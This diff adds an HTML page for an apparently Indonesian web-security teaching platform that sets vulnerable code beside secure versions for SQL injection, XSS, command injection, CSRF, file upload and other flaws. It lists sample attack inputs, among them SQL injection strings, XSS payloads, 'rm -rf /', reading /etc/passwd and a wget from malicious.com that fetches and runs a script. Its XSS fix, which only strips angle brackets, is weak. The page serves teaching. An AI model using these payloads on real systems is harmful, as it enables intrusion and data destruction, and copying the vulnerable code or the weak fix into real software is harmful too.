@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Learning Platform</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        .section {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .vulnerable {
+            border-left: 4px solid #ff4444;
+        }
+        .secure {
+            border-left: 4px solid #00C851;
+        }
+        h1, h2 {
+            color: #333;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        input, textarea {
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .result {
+            margin-top: 10px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 4px;
+        }
+        .error {
+            color: #dc3545;
+        }
+        .success {
+            color: #28a745;
+        }
+        .description {
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #e9ecef;
+            border-radius: 4px;
+        }
+        .code-example {
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            margin: 10px 0;
+        }
+        .example-input {
+            margin-top: 10px;
+            padding: 10px;
+            background: #e9ecef;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Security Learning Platform</h1>
+    <p>Platform pembelajaran keamanan web yang mendemonstrasikan berbagai kerentanan umum dan implementasi amannya.</p>
+
+    <div class="container">
+        <!-- SQL Injection Section -->
+        <div class="section vulnerable">
+            <h2>SQL Injection (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Serangan yang memanipulasi query SQL melalui input pengguna.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    db.all(`SELECT * FROM users WHERE username LIKE '%${query}%'`);
+                </div>
+                <div class="example-input">
+                    <h4>Contoh Input:</h4>
+                    <ul>
+                        <li><code>admin' --</code> - Bypass login</li>
+                        <li><code>%' UNION SELECT * FROM users --</code> - Extract all users</li>
+                        <li><code>'; DROP TABLE users; --</code> - Drop table</li>
+                    </ul>
+                </div>
+            </div>
+            <form id="sqlInjectionForm">
+                <input type="text" id="searchQuery" placeholder="Search users...">
+                <button type="submit">Search</button>
+            </form>
+            <div id="sqlInjectionResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>SQL Injection (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman menggunakan parameterized queries.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    db.all(`SELECT * FROM users WHERE username LIKE ?`, [`%${query}%`]);
+                </div>
+            </div>
+            <form id="sqlInjectionSecureForm">
+                <input type="text" id="searchQuerySecure" placeholder="Search users...">
+                <button type="submit">Search</button>
+            </form>
+            <div id="sqlInjectionSecureResult" class="result"></div>
+        </div>
+
+        <!-- XSS Section -->
+        <div class="section vulnerable">
+            <h2>XSS (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Serangan yang menyisipkan kode JavaScript berbahaya ke dalam halaman web.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    res.json({ content }); // No sanitization
+                </div>
+                <div class="example-input">
+                    <h4>Contoh Input:</h4>
+                    <ul>
+                        <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Basic XSS</li>
+                        <li><code>&lt;img src="x" onerror="alert('XSS')"&gt;</code> - Image XSS</li>
+                        <li><code>&lt;svg onload="alert('XSS')"&gt;</code> - SVG XSS</li>
+                    </ul>
+                </div>
+            </div>
+            <form id="xssForm">
+                <textarea id="commentContent" placeholder="Enter your comment..."></textarea>
+                <button type="submit">Post Comment</button>
+            </form>
+            <div id="xssResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>XSS (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman dengan sanitasi input.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    const sanitizedContent = content.replace(/[<>]/g, '');<br>
+                    res.json({ content: sanitizedContent });
+                </div>
+            </div>
+            <form id="xssSecureForm">
+                <textarea id="commentContentSecure" placeholder="Enter your comment..."></textarea>
+                <button type="submit">Post Comment</button>
+            </form>
+            <div id="xssSecureResult" class="result"></div>
+        </div>
+
+        <!-- Command Injection Section -->
+        <div class="section vulnerable">
+            <h2>Command Injection (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Serangan yang memanipulasi perintah sistem melalui input pengguna.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    exec(command, (error, stdout) => { ... });
+                </div>
+                <div class="example-input">
+                    <h4>Contoh Input:</h4>
+                    <ul>
+                        <li><code>ls; cat /etc/passwd</code> - Read system file</li>
+                        <li><code>rm -rf /</code> - Delete files</li>
+                        <li><code>wget http://malicious.com/script.sh && chmod +x script.sh && ./script.sh</code> - Download and execute</li>
+                    </ul>
+                </div>
+            </div>
+            <form id="commandInjectionForm">
+                <input type="text" id="command" placeholder="Enter command...">
+                <button type="submit">Execute</button>
+            </form>
+            <div id="commandInjectionResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>Command Injection (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman dengan whitelist perintah.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    const allowedCommands = ['ls', 'pwd', 'date'];<br>
+                    if (!allowedCommands.includes(command)) { ... }
+                </div>
+            </div>
+            <form id="commandInjectionSecureForm">
+                <input type="text" id="commandSecure" placeholder="Enter command (ls, pwd, date)">
+                <button type="submit">Execute</button>
+            </form>
+            <div id="commandInjectionSecureResult" class="result"></div>
+        </div>
+
+        <!-- Authentication Section -->
+        <div class="section vulnerable">
+            <h2>Authentication (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Kerentanan dalam mekanisme autentikasi yang memungkinkan bypass login.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    if (user.password === password) { ... }
+                </div>
+                <div class="example-input">
+                    <h4>Contoh Input:</h4>
+                    <ul>
+                        <li>Username: <code>admin</code>, Password: <code>' OR '1'='1</code></li>
+                        <li>Username: <code>admin' --</code>, Password: <code>anything</code></li>
+                        <li>Username: <code>admin</code>, Password: <code>admin123</code> (default)</li>
+                    </ul>
+                </div>
+            </div>
+            <form id="authForm">
+                <input type="text" id="username" placeholder="Username">
+                <input type="password" id="password" placeholder="Password">
+                <button type="submit">Login</button>
+            </form>
+            <div id="authResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>Authentication (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman dengan password hashing dan JWT.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    const match = await bcrypt.compare(password, user.password);<br>
+                    if (match) { ... }
+                </div>
+            </div>
+            <form id="authSecureForm">
+                <input type="text" id="usernameSecure" placeholder="Username">
+                <input type="password" id="passwordSecure" placeholder="Password">
+                <button type="submit">Login</button>
+            </form>
+            <div id="authSecureResult" class="result"></div>
+        </div>
+
+        <!-- CSRF Section -->
+        <div class="section vulnerable">
+            <h2>CSRF (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Serangan yang memaksa pengguna melakukan aksi yang tidak diinginkan.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    app.post('/api/admin/deleteAll', (req, res) => { ... });
+                </div>
+                <div class="example-input">
+                    <h4>Contoh Serangan:</h4>
+                    <ul>
+                        <li>Buat form tersembunyi di halaman berbahaya</li>
+                        <li>Auto-submit form saat halaman dimuat</li>
+                        <li>Target: <code>http://localhost:3000/api/vulnerable/admin/deleteAll</code></li>
+                    </ul>
+                </div>
+            </div>
+            <form id="csrfForm">
+                <button type="submit">Delete All Comments</button>
+            </form>
+            <div id="csrfResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>CSRF (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman dengan CSRF token.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    if (csrfToken !== req.session.csrfToken) { ... }
+                </div>
+            </div>
+            <form id="csrfSecureForm">
+                <input type="hidden" id="csrfToken">
+                <button type="submit">Delete All Comments</button>
+            </form>
+            <div id="csrfSecureResult" class="result"></div>
+        </div>
+    </div>
+
+    <!-- Additional Security Vulnerabilities -->
+    <div class="container">
+        <!-- Mass Assignment Section -->
+        <div class="section vulnerable">
+            <h2>Mass Assignment (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Kerentanan yang memungkinkan penyerang mengubah properti objek yang tidak seharusnya bisa diubah.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    const user = { ...req.body }; // Accepts all fields
+                </div>
+                <div class="example-input">
+                    <h4>Contoh Input:</h4>
+                    <ul>
+                        <li><code>{"id": 1, "role": "admin", "isAdmin": true}</code></li>
+                        <li><code>{"id": 1, "password": "newpassword"}</code></li>
+                        <li><code>{"id": 1, "apiKey": "newkey"}</code></li>
+                    </ul>
+                </div>
+            </div>
+            <form id="massAssignmentForm">
+                <input type="hidden" id="userId" value="1">
+                <div class="form-group">
+                    <label for="userEmail">Email:</label>
+                    <input type="text" id="userEmail" name="email">
+                </div>
+                <div class="form-group">
+                    <label for="userRole">Role:</label>
+                    <input type="text" id="userRole" name="role">
+                </div>
+                <div class="form-group">
+                    <label for="userIsAdmin">Is Admin:</label>
+                    <input type="text" id="userIsAdmin" name="isAdmin">
+                </div>
+                <div class="form-group">
+                    <label for="userPassword">Password:</label>
+                    <input type="text" id="userPassword" name="password">
+                </div>
+                <div class="form-group">
+                    <label for="userApiKey">API Key:</label>
+                    <input type="text" id="userApiKey" name="apiKey">
+                </div>
+                <button type="submit">Update User</button>
+            </form>
+            <div id="massAssignmentResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>Mass Assignment (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman dengan whitelist properti yang diizinkan.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    const allowedFields = ['email', 'name'];<br>
+                    const user = Object.keys(req.body)<br>
+                        .filter(key => allowedFields.includes(key))<br>
+                        .reduce((obj, key) => { ... });
+                </div>
+            </div>
+            <form id="massAssignmentSecureForm">
+                <input type="hidden" id="userIdSecure" value="1">
+                <div class="form-group">
+                    <label for="userEmailSecure">Email:</label>
+                    <input type="text" id="userEmailSecure" name="email">
+                </div>
+                <div class="form-group">
+                    <label for="userNameSecure">Name:</label>
+                    <input type="text" id="userNameSecure" name="name">
+                </div>
+                <button type="submit">Update User</button>
+            </form>
+            <div id="massAssignmentSecureResult" class="result"></div>
+        </div>
+
+        <!-- File Upload Section -->
+        <div class="section vulnerable">
+            <h2>File Upload (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Kerentanan yang memungkinkan upload file berbahaya tanpa validasi.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    app.post('/upload', (req, res) => {<br>
+                        const file = req.files.file;<br>
+                        file.mv('./uploads/' + file.name);
+                    });
+                </div>
+                <div class="example-input">
+                    <h4>Contoh File Berbahaya:</h4>
+                    <ul>
+                        <li>PHP shell: <code>shell.php</code></li>
+                        <li>JPG dengan PHP: <code>image.jpg.php</code></li>
+                        <li>Executable: <code>malware.exe</code></li>
+                    </ul>
+                </div>
+            </div>
+            <form id="fileUploadForm">
+                <input type="file" id="fileInput">
+                <button type="submit">Upload File</button>
+            </form>
+            <div id="fileUploadResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>File Upload (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman dengan validasi tipe file dan sanitasi nama file.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    const allowedTypes = ['image/jpeg', 'image/png'];<br>
+                    if (!allowedTypes.includes(file.mimetype)) { ... }<br>
+                    const safeName = sanitizeFileName(file.name);
+                </div>
+            </div>
+            <form id="fileUploadSecureForm">
+                <input type="file" id="fileInputSecure" accept="image/jpeg,image/png">
+                <button type="submit">Upload File</button>
+            </form>
+            <div id="fileUploadSecureResult" class="result"></div>
+        </div>
+
+        <!-- Session Management Section -->
+        <div class="section vulnerable">
+            <h2>Session Management (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Kerentanan dalam manajemen sesi yang memungkinkan session hijacking.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    app.use(session({<br>
+                        secret: 'keyboard cat',<br>
+                        resave: false,<br>
+                        saveUninitialized: true
+                    }));
+                </div>
+                <div class="example-input">
+                    <h4>Contoh Serangan:</h4>
+                    <ul>
+                        <li>Session ID: <code>123456</code> (predictable)</li>
+                        <li>Cookie: <code>session=123456</code> (no httpOnly)</li>
+                        <li>Session Fixation: <code>session=attacker_session</code></li>
+                    </ul>
+                </div>
+            </div>
+            <form id="sessionForm">
+                <input type="text" id="sessionData" placeholder="Session Data">
+                <button type="submit">Update Session</button>
+            </form>
+            <div id="sessionResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>Session Management (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman dengan secure session configuration.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    app.use(session({<br>
+                        secret: process.env.SESSION_SECRET,<br>
+                        cookie: {<br>
+                            secure: true,<br>
+                            httpOnly: true,<br>
+                            sameSite: 'strict'
+                        }
+                    }));
+                </div>
+            </div>
+            <form id="sessionSecureForm">
+                <input type="text" id="sessionDataSecure" placeholder="Session Data">
+                <button type="submit">Update Session</button>
+            </form>
+            <div id="sessionSecureResult" class="result"></div>
+        </div>
+
+        <!-- Open Redirect Section -->
+        <div class="section vulnerable">
+            <h2>Open Redirect (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Kerentanan yang memungkinkan redirect ke URL berbahaya.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    app.get('/redirect', (req, res) => {<br>
+                        res.redirect(req.query.url);
+                    });
+                </div>
+                <div class="example-input">
+                    <h4>Contoh URL Berbahaya:</h4>
+                    <ul>
+                        <li><code>https://malicious.com</code></li>
+                        <li><code>javascript:alert('XSS')</code></li>
+                        <li><code>data:text/html,<script>alert('XSS')</script></code></li>
+                    </ul>
+                </div>
+            </div>
+            <form id="redirectForm">
+                <input type="text" id="redirectUrl" placeholder="Redirect URL">
+                <button type="submit">Redirect</button>
+            </form>
+            <div id="redirectResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>Open Redirect (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman dengan whitelist URL yang diizinkan.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    const allowedDomains = ['example.com', 'trusted.com'];<br>
+                    if (!isAllowedDomain(url)) { ... }
+                </div>
+            </div>
+            <form id="redirectSecureForm">
+                <input type="text" id="redirectUrlSecure" placeholder="Redirect URL">
+                <button type="submit">Redirect</button>
+            </form>
+            <div id="redirectSecureResult" class="result"></div>
+        </div>
+
+        <!-- API Authentication Section -->
+        <div class="section vulnerable">
+            <h2>API Authentication (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Kerentanan dalam autentikasi API yang lemah.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    const apiKey = req.headers['x-api-key'];<br>
+                    if (apiKey === '123456') { ... }
+                </div>
+                <div class="example-input">
+                    <h4>Contoh Serangan:</h4>
+                    <ul>
+                        <li>API Key: <code>123456</code> (hardcoded)</li>
+                        <li>Token: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</code> (weak JWT)</li>
+                        <li>Basic Auth: <code>admin:password</code> (base64 encoded)</li>
+                    </ul>
+                </div>
+            </div>
+            <form id="apiAuthForm">
+                <input type="text" id="apiKey" placeholder="API Key">
+                <button type="submit">Access API</button>
+            </form>
+            <div id="apiAuthResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>API Authentication (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman dengan JWT dan rate limiting.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    const token = jwt.verify(req.headers.authorization, secret);<br>
+                    app.use(rateLimit({ windowMs: 15 * 60 * 1000 }));
+                </div>
+            </div>
+            <form id="apiAuthSecureForm">
+                <input type="text" id="apiKeySecure" placeholder="API Key">
+                <button type="submit">Access API</button>
+            </form>
+            <div id="apiAuthSecureResult" class="result"></div>
+        </div>
+
+        <!-- Sensitive Data Logging Section -->
+        <div class="section vulnerable">
+            <h2>Sensitive Data Logging (Vulnerable)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Kerentanan dalam logging data sensitif.</p>
+                <div class="code-example">
+                    // Vulnerable Code<br>
+                    console.log('User data:', user);<br>
+                    logger.info('Payment processed:', payment);
+                </div>
+                <div class="example-input">
+                    <h4>Contoh Data Sensitif:</h4>
+                    <ul>
+                        <li><code>{"password": "secret123", "creditCard": "4111111111111111"}</code></li>
+                        <li><code>{"email": "user@example.com", "ssn": "123-45-6789"}</code></li>
+                        <li><code>{"apiKey": "sk_live_123456", "token": "eyJhbGciOiJ..."}</code></li>
+                    </ul>
+                </div>
+            </div>
+            <form id="loggingForm">
+                <input type="text" id="userData" placeholder="User Data">
+                <button type="submit">Log Data</button>
+            </form>
+            <div id="loggingResult" class="result"></div>
+        </div>
+
+        <div class="section secure">
+            <h2>Sensitive Data Logging (Secure)</h2>
+            <div class="description">
+                <h3>Deskripsi</h3>
+                <p>Implementasi aman dengan sanitasi data sensitif.</p>
+                <div class="code-example">
+                    // Secure Code<br>
+                    const sanitizedUser = {<br>
+                        id: user.id,<br>
+                        role: user.role<br>
+                    };<br>
+                    logger.info('User action:', sanitizedUser);
+                </div>
+            </div>
+            <form id="loggingSecureForm">
+                <input type="text" id="userDataSecure" placeholder="User Data">
+                <button type="submit">Log Data</button>
+            </form>
+            <div id="loggingSecureResult" class="result"></div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html> 
